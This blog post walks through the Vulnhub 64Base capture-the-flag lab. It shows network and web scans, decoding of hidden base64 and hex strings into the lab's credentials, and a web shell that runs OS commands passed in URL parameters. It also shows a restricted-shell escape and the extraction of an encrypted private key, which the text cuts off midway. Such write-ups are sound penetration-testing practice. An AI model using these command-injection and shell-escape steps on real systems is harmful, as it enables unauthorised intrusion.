---
layout:     post
title:      "Vulnhub.com - 64Base 1.0.1"
subtitle:   "Write-Up"
date:       2017-02-12 00:00:00
author:     "W3ndige"
header-img: "img/64base-header.jpeg"
category: Write-Ups
---

<h1>Introduction</h1>

<p>Today we're going to try and complete another challenge from Vulnhub, called 64Base. There are two objectives: the main one is to steal the plans for the Death Star before it's too late, and secondary quest consits of collecting all 6 flags. So without further suppression, let's jump in! </p>

<h1>Write-Up</h1>

<p>Firstly, we have to find what IP address was assigned to this machine.  </p>

{% highlight bash %}
root@kali:~# nmap 192.168.56.1/24

Starting Nmap 7.01 ( https://nmap.org ) at 2017-02-10 15:31 EST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.1
Host is up (0.000076s latency).
All 1000 scanned ports on 192.168.56.1 are closed
MAC Address: 0A:00:27:00:00:00 (Unknown)

Nmap scan report for 192.168.56.100
Host is up (0.00026s latency).
All 1000 scanned ports on 192.168.56.100 are filtered
MAC Address: 08:00:27:E5:1B:1D (Oracle VirtualBox virtual NIC)

Nmap scan report for 192.168.56.102
Host is up (0.00024s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
4899/tcp open  radmin
MAC Address: 08:00:27:68:E7:F8 (Oracle VirtualBox virtual NIC)

Nmap scan report for 192.168.56.101
Host is up (0.0000070s latency).
All 1000 scanned ports on 192.168.56.101 are closed

Nmap done: 256 IP addresses (4 hosts up) scanned in 5.50 seconds

{% endhighlight %}

<p>Okay, <b>192.168.56.102</b> is our vulnerable machine. We also have some basic info about the ports - <b>ssh</b>, <b>http</b> and <b>radmin</b>. </p>

<h2>First flag</h2>

<p>Let's start by checking the <b>80</b> port, and the website. </p>

![Website-First-Look](/img/64base/website-first.png){:class="img-responsive center-block"}

<p>What's this random string in the subheader? <b>Base64</b>? Let's check that out. </p>

{% highlight bash %}
root@kali:~# echo dmlldyBzb3VyY2UgO0QK | base64 -d
view source ;D
{% endhighlight %}

<p>Great clue! After checking the source code, I've noticed this string in <b>header</b> section of index. </p>


{% highlight html %}
<!-- Page Header -->
 <!-- Set your background image for this header on the line below. -->
 <header class="intro-header" style="background-image: url('img/home-bg.jpg')">
     <div class="container">
         <div class="row">
             <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                 <div class="site-heading">
                     <h1>64base</h1>
                     <hr class="small">
                     <span class="subheading">dmlldyBzb3VyY2UgO0QK</span>
                     <!--5a6d78685a7a4637546d705361566c59546d785062464a7654587056656c464953587055616b4a56576b644752574e7151586853534842575555684b6246524551586454656b5a77596d316a4d454e6e5054313943673d3d0a-->
                 </div>
             </div>
         </div>
     </div>
 </header>
{% endhighlight %}

<p>It looks like hexadecimals, which we can try to decode using <b>xxd</b> tool. </p>

{% highlight bash %}
root@kali:~# echo 5a6d78685a7a4637546d705361566c59546d785062464a7654587056656c464953587055616b4a56576b644752574e7151586853534842575555684b6246524551586454656b5a77596d316a4d454e6e5054313943673d3d0a | xxd -r -p
ZmxhZzF7TmpSaVlYTmxPbFJvTXpVelFISXpUakJVWkdGRWNqQXhSSHBWUUhKbFREQXdTekZwYm1jMENnPT19Cg==
{% endhighlight %}

<p>After that, it's just simple base64 decryption.</p>

{% highlight bash %}
root@kali:~# echo ZmxhZzF7TmpSaVlYTmxPbFJvTXpVelFISXpUakJVWkdGRWNqQXhSSHBWUUhKbFREQXdTekZwYm1jMENnPT19Cg== | base64 -d
flag1{NjRiYXNlOlRoMzUzQHIzTjBUZGFEcjAxRHpVQHJlTDAwSzFpbmc0Cg==}
{% endhighlight %}

<p>Yeah, first flag! But its content also looks like base64. Maybe it will reveal something more? </p>

{% highlight bash %}
root@kali:~# echo NjRiYXNlOlRoMzUzQHIzTjBUZGFEcjAxRHpVQHJlTDAwSzFpbmc0Cg== | base64 -d
64base:Th353@r3N0TdaDr01DzU@reL00K1ing4
{% endhighlight %}

<p>Password pair? Let's note that for later. </p>

<h2>Second flag</h2>

<p>I think that looking at this site manually searching for clues may take ages. <b>Nikto</b> scan will be great help! </p>

{% highlight bash %}
root@kali:~# nikto -h 192.168.56.102
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.102
+ Target Hostname:    192.168.56.102
+ Target Port:        80
+ Start Time:         2017-02-11 08:07:19 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.10 (Debian)
+ Server leaks inodes via ETags, header found with file /, fields: 0x1fdf 0x542f6bd9b68a0
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Entry '/88888/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/88888888/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/88888888888/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/88888888888P/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/c3P08P/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/C3p0/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/A280/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
...
+ "robots.txt" contains 429 entries which should be manually viewed.
+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+ OSVDB-3268: /img/: Directory indexing found.
+ OSVDB-3092: /img/: This might be interesting...
+ OSVDB-3268: /mail/: Directory indexing found.
+ OSVDB-3092: /mail/: This might be interesting...
+ OSVDB-3092: /members/: This might be interesting...
+ OSVDB-3092: /order/: This might be interesting...
+ OSVDB-3092: /staff/: This might be interesting...
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ OSVDB-3092: /as/: This might be interesting... potential country code (American Samoa)
+ OSVDB-3092: /by/: This might be interesting... potential country code (Belarus)
+ OSVDB-3092: /is/: This might be interesting... potential country code (Iceland)
+ OSVDB-3092: /no/: This might be interesting... potential country code (Norway)
+ OSVDB-3092: /to/: This might be interesting... potential country code (Tonga)
+ 8115 requests: 0 error(s) and 434 item(s) reported on remote host
+ End Time:           2017-02-11 08:07:58 (GMT-5) (39 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
{% endhighlight %}

<p>That's a lot of <b>robots.txt</b> entries, but it may give us some interesting information. For now, let's save it. </p>

<p>What I've found even more interesting is this image in the post file. It's just full of this random (or not?) clues. </p>

![Website-Image](/img/64base/website-image.png){:class="img-responsive center-block"}

<p><b>IMPORTANT!!! USE SYSTEM INSTEAD OF EXEC TO RUN THE SECRET 5H377</b></p>
<p>What can it mean? And this comment under the image? </p>
<p><b>Only respond if you are a real Imperial-Class BountyHunter</b></p>

<p>At this moment it won't help us, but saving it for later may come handy.  </p>

<p>But, wait a minute. "<b>Imperial-class</b>" also appears in robots.txt file. </p>

{% highlight text %}
Disallow: /houses/
Disallow: /humans/
Disallow: /Imperial/
Disallow: /Imperial-class/
Disallow: /individual/
Disallow: /initial/
Disallow: /instituted/
{% endhighlight %}

<p>Let's view it. Even though /Imperial-class/ was empty, I've still tried <b>/Imperial-Class/</b>, which worked! </p>
<p>Unfortunately we have another problem, it immediately asks us for login and password. And no known credentials works. Maybe source code will tell us something more?  </p>

![Imperial-Class-Login](/img/64base/imperial-class-login.png){:class="img-responsive center-block"}

<p>Now that's something useful. We can try to add <b>/BountyHunter</b> to the URL. Also, do You remember the "...real Imperial-Class BountyHunter"? Great hint! </p>

![BountyHunter-Login](/img/64base/bountyhunter.png){:class="img-responsive center-block"}

<p>Another login page... Once again I've tried to login as in the previuos form, but this time nothing happened. Maybe source code, once again, will show us something? Yes! I've noticed 3 strings, let's concatenate them together, and decode from hex.  </p>

{% highlight bash %}
root@kali:~# echo 5a6d78685a7a4a37595568534d474e4954545a4d65546b7a5a444e6a645756584f54466b53465a70576c4d31616d49794d485a6b4d6b597757544a6e4c3252714d544a54626d51315a45566157464655614446525557383966516f3d0a | xxd -r -p
ZmxhZzJ7YUhSMGNITTZMeTkzZDNjdWVXOTFkSFZpWlM1amIyMHZkMkYwWTJnL2RqMTJTbmQ1ZEVaWFFUaDFRUW89fQo=
{% endhighlight %}

<p>Now decode this base64. </p>

{% highlight bash %}
root@kali:~# echo ZmxhZzJ7YUhSMGNITTZMeTkzZDNjdWVXOTFkSFZpWlM1amIyMHZkMkYwWTJnL2RqMTJTbmQ1ZEVaWFFUaDFRUW89fQo= | base64 -d
flag2{aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj12Snd5dEZXQTh1QQo=}
{% endhighlight %}

<p>And we've got second flag! Four more to go. But firstly, let's decode the inside of the flag, looking for a hint.  </p>

{% highlight bash %}
root@kali:~# echo aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj12Snd5dEZXQTh1QQo= | base64 -d
https://www.youtube.com/watch?v=vJwytFWA8uA
{% endhighlight %}

<p>Youtube film? </p>

<h2>Third flag</h2>

<p>I struggled a lot while trying to get this flag. Even this YouTube video couldn't help me :( After some time, maybe due to my luck, by playing with <b>curl</b> and <b>login.php</b> I got the next flag.</p>

{%highlight bash %}
root@kali:~# curl -u 64base:Th353@r3N0TdaDr01DzU@reL00K1ing4 "http://192.168.56.102/Imperial-Class/BountyHunter/login.php"

flag3{NTNjcjN0NWgzNzcvSW1wZXJpYWwtQ2xhc3MvQm91bnR5SHVudGVyL2xvZ2luLnBocD9mPWV4ZWMmYz1pZAo=}
{% endhighlight %}

<p>I've actually tried to login using these credentials, but nothing happened. Luckily, I got it here ;) Now let's decode this flag. </p>

{% highlight bash %}
root@kali:~# echo NTNjcjN0NWgzNzcvSW1wZXJpYWwtQ2xhc3MvQm91bnR5SHVudGVyL2xvZ2luLnBocD9mPWV4ZWMmYz1pZAo= | base64 -d
53cr3t5h377/Imperial-Class/BountyHunter/login.php?f=exec&c=id
{% endhighlight %}

<h2>Fourth flag</h2>

<p>Let's take a look at this link. </p>

![Found-Link](/img/64base/early-shell.png){:class="img-responsive center-block"}

<p>As I suspected, nothing happened.</p>
<p>Remember the image from the post page? It said to use system instead of exec. </p>

![System-shell](/img/64base/shell-system.png){:class="img-responsive center-block"}

<p>That's what I like, another flag! Now, let's decode it. </p>

{% highlight bash %}
root@kali:~# echo NjRiYXNlOjY0YmFzZTVoMzc3Cg== | base64 -d
64base:64base5h377
{% endhighlight %}

<h2>Fifth flag</h2>

<p>After all that, I think we can try to work on the SSH ports. Firstly, I'll run another Nmap scan, checking all possible ports, to check, whether or not we are missing anything. </p>

{% highlight bash %}
root@kali:~# nmap -Pn -A -p- 192.168.56.102

Starting Nmap 7.01 ( https://nmap.org ) at 2017-02-11 13:48 EST

PORT      STATE SERVICE VERSION
22/tcp    open  ssh?
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
| http-robots.txt: 429 disallowed entries (15 shown)
| /administrator/ /admin/ /login/ /88888/ /88888888/
| /88888888888/ /88888888888P/ /c3P08P/ /C3p0/ /A280/ /above/ /AC1/
|_/across/ /activation/ /Adjustments/
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: 64base
4899/tcp  open  radmin?
62964/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
| ssh-hostkey:
|   1024 59:a5:02:ba:72:8a:2e:c1:9c:ff:cc:b2:f8:15:66:b3 (DSA)
|   2048 2a:57:2c:75:8c:34:9f:28:84:15:07:2a:be:d0:41:98 (RSA)
|_  256 97:94:13:38:92:70:6c:3a:c0:4f:f3:f3:e7:ce:40:91 (ECDSA)


{% endhighlight %}

<p>Wow, we have another SSH, at port <b>62964</b>. </p>

{% highlight bash %}
root@kali:~# nc -nv 192.168.56.102 22
(UNKNOWN) [192.168.56.102] 22 (ssh) open
The programs included with the Fedora GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Fedora GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Oct 24 02:04:10 4025 from 010.101.010.001

#

{% endhighlight %}

<p>Hmmm, these credentials seem a little bit odd. Let's try the second one, where as login:password pair we can use decrypted content of previous flag - 64base:64base5h377. Unfortunately, these don't seem to work. </p>

<p>After a while, I came with idea of encrypting the password using base64, and feeling to do this was right! This credentials have worked. </p>

{% highlight bash %}
root@kali:~# echo 64base5h377 | base64
NjRiYXNlNWgzNzcK
{% endhighlight %}

<p>Than let's log in. </p>

{% highlight bash %}
root@kali:~# ssh 64base@192.168.56.102 -p 62964
64base@192.168.56.102's password:

Last login: Sat Feb 11 18:25:53 2017 from 192.168.56.101
64base@64base:~$
{% endhighlight %}


<p>Great, we're in. But what now? None of the commands seems to work. </p>

{% highlight bash %}
64base@64base:~$ ls -la
well_done_:D
64base@64base:~$ cat well_done_:D
 _           
 \\                                                       
  \\_          _.-._                
   X:\        (_/ \_)         
   \::\       ( ==  )          
    \::\       \== /          
   /X:::\   .-./`-'\.--.       
   \\/\::\ / /     (    l      
    ~\ \::\ /      `.   L.      
      \/:::|         `.'  `     
      /:/\:|         `(    `.    
      \/`-'`.          >    )     
             \       //  .-'     
              |     /(  .'        
              `-..-'_ \  \        
              __||/  \ `-'          
             / _ \ #  |            
            |  #  |#  |           
         LS |  #  |#             

    BioTronics Security Droid
64base@64base:~$ uname -a
-rbash: uname: command not found
{% endhighlight %}

<p>After spending lot of time, trying different combinations of commands, I've decided to look in the <b>env</b> variables. Custom <b>$PATH</b>? Let's take a look at it. </p>

{% highlight bash %}
64base@64base:~$ env
TERM=xterm-256color
SHELL=/bin/rbash
SSH_CLIENT=192.168.56.101 45436 62964
SSH_TTY=/dev/pts/0
USER=64base
MAIL=/var/mail/64base
PATH=/var/alt-bin
PWD=/64base
LANG=en_GB.UTF-8
GCC_COLORS=error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01
SHLVL=1
HOME=/64base
LANGUAGE=en_GB:en
LOGNAME=64base
SSH_CONNECTION=192.168.56.101 45436 192.168.56.102 62964
_=/var/alt-bin/env
64base@64base:~$ echo $PATH/*
/var/alt-bin/awk /var/alt-bin/base64 /var/alt-bin/cat /var/alt-bin/dircolors /var/alt-bin/droids /var/alt-bin/egrep /var/alt-bin/env /var/alt-bin/fgrep /var/alt-bin/file /var/alt-bin/find /var/alt-bin/grep /var/alt-bin/head /var/alt-bin/less /var/alt-bin/ls /var/alt-bin/more /var/alt-bin/perl /var/alt-bin/python /var/alt-bin/ruby /var/alt-bin/tail
{% endhighlight %}

<p>Great, we have the list of all executables that we have access to. But wait can You see it too? What are droids? Let's check that out! </p>

![Droids-executable](/img/64base/matrix.png){:class="img-responsive center-block"}

<p>Wow, cool effect. But it seems to go in an infinite loop. </p>

![Droids-after](/img/64base/droids.png){:class="img-responsive center-block"}

<p>After closing down, it showed this message. But is that it? Some cryptic clues? Luckily no, somehow we are now able to execute previously restricted commands. </p>

{% highlight bash %}
64base@64base:~$ uname -a
Linux 64base 3.16.0-4-586 #1 Debian 3.16.36-1+deb8u2 (2016-10-19) i686 GNU/Linux
{% endhighlight %}

<p>We can now find next flag! After some more searching I've found it in <b>/var/www/html/admin/S3cR37</b> directory.  </p>

{% highlight bash %}
64base@64base:/$ cd /var/www
64base@64base:/var/www/html$ cd admin
64base@64base:/var/www/html/admin$ ls -la
index.php  S3cR37
64base@64base:/var/www/html/admin$ cd S3cR37/
64base@64base:/var/www/html/admin/S3cR37$ ls -la
flag5{TG9vayBJbnNpZGUhIDpECg==}
{% endhighlight %}

<p>Let's decode it. </p>

{% highlight bash %}
64base@64base:/var/www/html/admin/S3cR37$ echo TG9vayBJbnNpZGUhIDpECg== | base64 -d
Look Inside! :D
{% endhighlight %}

<h2>Sixth flag</h2>

<p>Let's check this file using <b>file</b> command. </p>

{% highlight bash %}
64base@64base:/var/www/html/admin/S3cR37$ file flag5{TG9vayBJbnNpZGUhIDpECg==}
flag5{TG9vayBJbnNpZGUhIDpECg==}: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, comment: "4c5330744c5331435255644a546942535530456755464a4a566b4655525342", baseline, precision 8, 960x720, frames 3
{% endhighlight %}

<p>JPEG image? We can copy it to Kali using <b>scp</b>. </p>

{% highlight bash %}
root@kali:~# scp -P 62964 64base@192.168.56.102:/var/www/html/admin/S3cR37/flag5{TG9vayBJbnNpZGUhIDpECg==} flag5.jpeg
64base@192.168.56.102's password:
flag5{TG9vayBJbnNpZGUhIDpECg==}               100%  192KB 192.0KB/s   00:00
{% endhighlight %}

![Use-the-force-Luke](/img/64base/usetheforce.png){:class="img-responsive center-block"}

<p>Okay, after all these puzzles, I think "<b>Use the force</b>" will be somehow essential in finding the next flag. But firstly, let's check this file for some more clues. After using <b>string</b> command, we can actually see some big chunk of data, looking like hexadecimal string. Let's decode it. </p>

{% highlight bash %}
64base@64base:/var/www/html/admin/S3cR37$ strings flag5{TG9vayBJbnNpZGUhIDpECg==}
JFIF
4c5330744c5331435255644a546942535530456755464a4a566b46555253424c52566b744c5330744c517051636d396a4c565235634755364944517352553544556c6c5156455645436b52460a5379314a626d5a764f69424252564d744d5449344c554e43517977324d6a46424d7a68425155513052546c475155457a4e6a55335130457a4f44673452446c434d7a553251776f4b625552300a556e684a643267304d464a54546b467a4d697473546c4a49646c4d356557684e4b325668654868564e586c795231424461334a6955566376556d64515543745352307043656a6c57636c52720a646c6c334e67705a59303931575756615457707a4e475a4a55473433526c7035536d64345230686f5533685262336857626a6c7252477433626e4e4e546b5270636e526a62304e50617a6c530a524546484e5756344f58673056453136436a684a624552435558453161546c5a656d6f35646c426d656d56435246706b53586f35524863795a323479553246465a335531656d56734b7a5a490a52303969526a686161444e4e53574e6f6554687a4d5668795254414b61335a4d53306b794e544a74656c64334e47746955334d354b31466856336c6f4d7a52724f45704a566e7031597a46520a51336c69656a56586231553157545532527a5a784d564a6b637a426959315a785446567a5a51704e5533704c617a4e745332465851586c4d574778764e3078756258467856555a4c5347356b0a516b557855326851566c5a704e47497752336c475355785054335a3062585a47596a5172656d68314e6d705056316c49436d73796147524453453554644374705a3264354f57686f4d3270680a52576456626c4e51576e56464e30354b6430525a5954646c553052685a3077784e31684c634774744d6c6c70516c5a7956566834566b31756232494b643168535a6a56435930644c56546b330a65475276636c59795648457261446c4c553278615a5463354f58527956484a475230356c4d4456326545527961576f315658517953324e52654373354f457334533342585441706e645570510a556c424c52326c71627a6b3253455248597a4e4d4e566c7a65453969566d63724c325a714d4546326330746d636d4e574c327834595663725357313562574d7854566870536b316962554e360a62455233436c52425632316863577453526b52355154464956585a30646c4e6c566e46544d533949616d6845647a6c6b4e45747a646e4e71613270326557565256484e7a5a6e4e6b52324e560a4d47684561316833556c647a6332514b4d6d517a5279744f616d3078556a56615445356e556d784f63465a48616d684c517a524263325a59557a4e4b4d486f7964444e4355453035576b39430a54554a6c4f5552344f4870744e58684757546c365633527964677042523342794d454a6f4f45745264323177616c4656597a46685a6e4e78595646594d465649546b7859564446615431644c0a616d63305530457a57454d355a454e4665555a784d464e4a65464671547a6c4d52304e48436a52524e57356a5a6c566f62585a3063586c3164454e7362444a6b5746427a57465a455a54526c0a6230517851327432536b354557544e4c554663725232744f4f5577724f554e516554677252453531626b5a4a6433674b4b3151724b7a64525a7939315546684c6354524e4e6a464a555467770a4d7a52566148565356314d30564846514f57463657444e44527a6c4d65573970516a5a57596b74505a555233546a68686157784d533170436377706d57546c524e6b464e4d584e3562476c360a53444675626e684c5433526155566431636e68715230704353584d324d6e526c6245317259584d356555354e617a4e4d64546478556b6732633364504f584e6b56454a70436974714d4867300a64555261616b706a5a30315965475a694d4863315154593062466c4763303153656b5a714e31686b5a6e6b784f53744e5a54684b525768524f45744f57455233555574456556564d526b39550a63336f4b4d544e575a6b4a4f65466c7a65557731656b6459546e703563566f3053533950547a644e5a575179616a4248656a426e4d6a4670534545764d445a74636e4d795932786b637a5a540a56554a4852585a754f4535705667707955334a494e6e5a46637a5254656d63776544686b5a45643255544278567a463254577455556e557a54336b765a544577526a63304e586845545546550a53314a7353316f32636c6c4954554e34536a4e4a59323530436b56364d45394e57466c6b517a5a4461555976535664305a3252564b32684c65585a7a4e484e4764454e4359327854595764740a5246524b4d6d74615a485530556c4a3357565a574e6d394a546e6f35596e4250646b554b556e677a534656785a6d354c553268796458704e4f56707261556c7264564e6d556e526d615531320a596c52365a6d5a4b56464d30597a513451303831574339535a5559765157464e654774695532524654305a7a53517047646a6c595a476b355532524f6458684853455579527a5249646b706b0a53584279526c5679566c4e7755306b344d48646e636d49794e44567a647a5a6e5647397064466f354d47684b4e47354b4e5746354e304648436c6c7059574531627a63344e7a63765a6e63320a57566f764d6c557a5155526b61564e50516d3072614770574d6b705765484a7665565659596b63315a475a734d32303452335a6d4e7a464b4e6a4a4753484534646d6f4b63557068626c4e720a4f4445334e586f77596d70795746646b5445637a52464e735355707063327851567974355247466d4e316c43566c6c33563149725645457861304d326157564a5154563056544e776269394a0a4d776f324e466f31625842444b3364785a6c52345232646c51334e6e53577335646c4e754d6e41765a5756305a456b7a5a6c46584f46645952564a69524756304d56564d5346427864456c700a4e314e61596d6f3464697451436d5a7553457852646b563353584d72516d59785133424c4d554672576d565654564a4655577443614552704e7a4a49526d4a334d6b6376656e46306153395a0a5a4735786545463562445a4d576e704a5a5646754f48514b4c3064714e477468636b6f78615530355357597a4f57524e4e55396851315a615569395554304a575956493462584a514e315a300a536d39794f57706c53444a305255777764473946635664434d56424c4d48565955416f744c5330744c55564f524342535530456755464a4a566b46555253424c52566b744c5330744c516f3d0a
-- Other data omitted --

root@kali:~# echo -- Enter this huge chunk of data --  | xxd -r -p
LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpQcm9jLVR5cGU6IDQsRU5DUllQVEVECkRF
Sy1JbmZvOiBBRVMtMTI4LUNCQyw2MjFBMzhBQUQ0RTlGQUEzNjU3Q0EzODg4RDlCMzU2QwoKbUR0
UnhJd2g0MFJTTkFzMitsTlJIdlM5eWhNK2VheHhVNXlyR1BDa3JiUVcvUmdQUCtSR0pCejlWclRr
dll3NgpZY091WWVaTWpzNGZJUG43Rlp5Smd4R0hoU3hRb3hWbjlrRGt3bnNNTkRpcnRjb0NPazlS
REFHNWV4OXg0VE16CjhJbERCUXE1aTlZemo5dlBmemVCRFpkSXo5RHcyZ24yU2FFZ3U1emVsKzZI
R09iRjhaaDNNSWNoeThzMVhyRTAKa3ZMS0kyNTJteld3NGtiU3M5K1FhV3loMzRrOEpJVnp1YzFR
Q3liejVXb1U1WTU2RzZxMVJkczBiY1ZxTFVzZQpNU3pLazNtS2FXQXlMWGxvN0xubXFxVUZLSG5k
QkUxU2hQVlZpNGIwR3lGSUxPT3Z0bXZGYjQremh1NmpPV1lICmsyaGRDSE5TdCtpZ2d5OWhoM2ph
RWdVblNQWnVFN05Kd0RZYTdlU0RhZ0wxN1hLcGttMllpQlZyVVh4Vk1ub2IKd1hSZjVCY0dLVTk3
eGRvclYyVHEraDlLU2xaZTc5OXRyVHJGR05lMDV2eERyaWo1VXQyS2NReCs5OEs4S3BXTApndUpQ
UlBLR2lqbzk2SERHYzNMNVlzeE9iVmcrL2ZqMEF2c0tmcmNWL2x4YVcrSW15bWMxTVhpSk1ibUN6
bER3ClRBV21hcWtSRkR5QTFIVXZ0dlNlVnFTMS9IamhEdzlkNEtzdnNqa2p2eWVRVHNzZnNkR2NV
MGhEa1h3Uldzc2QKMmQzRytOam0xUjVaTE5nUmxOcFZHamhLQzRBc2ZYUzNKMHoydDNCUE05Wk9C
TUJlOUR4OHptNXhGWTl6V3RydgpBR3ByMEJoOEtRd21walFVYzFhZnNxYVFYMFVITkxYVDFaT1dL
amc0U0EzWEM5ZENFeUZxMFNJeFFqTzlMR0NHCjRRNW5jZlVobXZ0cXl1dENsbDJkWFBzWFZEZTRl
b0QxQ2t2Sk5EWTNLUFcrR2tOOUwrOUNQeTgrRE51bkZJd3gKK1QrKzdRZy91UFhLcTRNNjFJUTgw
MzRVaHVSV1M0VHFQOWF6WDNDRzlMeW9pQjZWYktPZUR3TjhhaWxMS1pCcwpmWTlRNkFNMXN5bGl6
SDFubnhLT3RaUVd1cnhqR0pCSXM2MnRlbE1rYXM5eU5NazNMdTdxUkg2c3dPOXNkVEJpCitqMHg0
dURaakpjZ01YeGZiMHc1QTY0bFlGc01SekZqN1hkZnkxOStNZThKRWhROEtOWER3UUtEeVVMRk9U
c3oKMTNWZkJOeFlzeUw1ekdYTnp5cVo0SS9PTzdNZWQyajBHejBnMjFpSEEvMDZtcnMyY2xkczZT
VUJHRXZuOE5pVgpyU3JINnZFczRTemcweDhkZEd2UTBxVzF2TWtUUnUzT3kvZTEwRjc0NXhETUFU
S1JsS1o2cllITUN4SjNJY250CkV6ME9NWFlkQzZDaUYvSVd0Z2RVK2hLeXZzNHNGdENCY2xTYWdt
RFRKMmtaZHU0UlJ3WVZWNm9JTno5YnBPdkUKUngzSFVxZm5LU2hydXpNOVpraUlrdVNmUnRmaU12
YlR6ZmZKVFM0YzQ4Q081WC9SZUYvQWFNeGtiU2RFT0ZzSQpGdjlYZGk5U2ROdXhHSEUyRzRIdkpk
SXByRlVyVlNwU0k4MHdncmIyNDVzdzZnVG9pdFo5MGhKNG5KNWF5N0FHCllpYWE1bzc4NzcvZnc2
WVovMlUzQURkaVNPQm0raGpWMkpWeHJveVVYYkc1ZGZsM204R3ZmNzFKNjJGSHE4dmoKcUphblNr
ODE3NXowYmpyWFdkTEczRFNsSUppc2xQVyt5RGFmN1lCVll3V1IrVEExa0M2aWVJQTV0VTNwbi9J
Mwo2NFo1bXBDK3dxZlR4R2dlQ3NnSWs5dlNuMnAvZWV0ZEkzZlFXOFdYRVJiRGV0MVVMSFBxdElp
N1NaYmo4ditQCmZuSExRdkV3SXMrQmYxQ3BLMUFrWmVVTVJFUWtCaERpNzJIRmJ3MkcvenF0aS9Z
ZG5xeEF5bDZMWnpJZVFuOHQKL0dqNGthckoxaU05SWYzOWRNNU9hQ1ZaUi9UT0JWYVI4bXJQN1Z0
Sm9yOWplSDJ0RUwwdG9FcVdCMVBLMHVYUAotLS0tLUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=
{% endhighlight %}

<p>This looks like another base64 decryption. </p>

{% highlight bash %}
root@kali:~# echo -- Enter this huge chunk of base64 data --  | base64 -d
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,621A38AAD4E9FAA3657CA3888D9B356C

mDtRxIwh40RSNAs2+lNRHvS9yhM+eaxxU5yrGPCkrbQW/RgPP+RGJBz9VrTkvYw6
YcOuYeZMjs4fIPn7FZyJgxGHhSxQoxVn9kDkwnsMNDirtcoCOk9RDAG5ex9x4TMz
8IlDBQq5i9Yzj9vPfzeBDZdIz9Dw2gn2SaEgu5zel+6HGObF8Zh3MIchy8s1XrE0
kvLKI252mzWw4kbSs9+QaWyh34k8JIVzuc1QCybz5WoU5Y56G6q1Rds0bcVqLUse
MSzKk3mKaWAyLXlo7LnmqqUFKHndBE1ShPVVi4b0GyFILOOvtmvFb4+zhu6jOWYH
k2hdCHNSt+iggy9hh3jaEgUnSPZuE7NJwDYa7eSDagL17XKpkm2YiBVrUXxVMnob
wXRf5BcGKU97xdorV2Tq+h9KSlZe799trTrFGNe05vxDrij5Ut2KcQx+98K8KpWL
guJPRPKGijo96HDGc3L5YsxObVg+/fj0AvsKfrcV/lxaW+Imymc1MXiJMbmCzlDw
TAWmaqkRFDyA1HUvtvSeVqS1/HjhDw9d4KsvsjkjvyeQTssfsdGcU0hDkXwRWssd
2d3G+Njm1R5ZLNgRlNpVGjhKC4AsfXS3J0z2t3BPM9ZOBMBe9Dx8zm5xFY9zWtrv
AGpr0Bh8KQwmpjQUc1afsqaQX0UHNLXT1ZOWKjg4SA3XC9dCEyFq0SIxQjO9LGCG
4Q5ncfUhmvtqyutCll2dXPsXVDe4eoD1CkvJNDY3KPW+GkN9L+9CPy8+DNunFIwx
+T++7Qg/uPXKq4M61IQ8034UhuRWS4TqP9azX3CG9LyoiB6VbKOeDwN8ailLKZBs
fY9Q6AM1sylizH1nnxKOtZQWurxjGJBIs62telMkas9yNMk3Lu7qRH6swO9sdTBi
+j0x4uDZjJcgMXxfb0w5A64lYFsMRzFj7Xdfy19+Me8JEhQ8KNXDwQKDyULFOTsz
13VfBNxYsyL5zGXNzyqZ4I/OO7Med2j0Gz0g21iHA/06mrs2clds6SUBGEvn8NiV
rSrH6vEs4Szg0x8ddGvQ0qW1vMkTRu3Oy/e10F745xDMATKRlKZ6rYHMCxJ3Icnt
Ez0OMXYdC6CiF/IWtgdU+hKyvs4sFtCBclSagmDTJ2kZdu4RRwYVV6oINz9bpOvE
Rx3HUqfnKShruzM9ZkiIkuSfRtfiMvbTzffJTS4c48CO5X/ReF/AaMxkbSdEOFsI
Fv9Xdi9SdNuxGHE2G4HvJdIprFUrVSpSI80wgrb245sw6gToitZ90hJ4nJ5ay7AG
Yiaa5o7877/fw6YZ/2U3ADdiSOBm+hjV2JVxroyUXbG5dfl3m8Gvf71J62FHq8vj
qJanSk8175z0bjrXWdLG3DSlIJislPW+yDaf7YBVYwWR+TA1kC6ieIA5tU3pn/I3
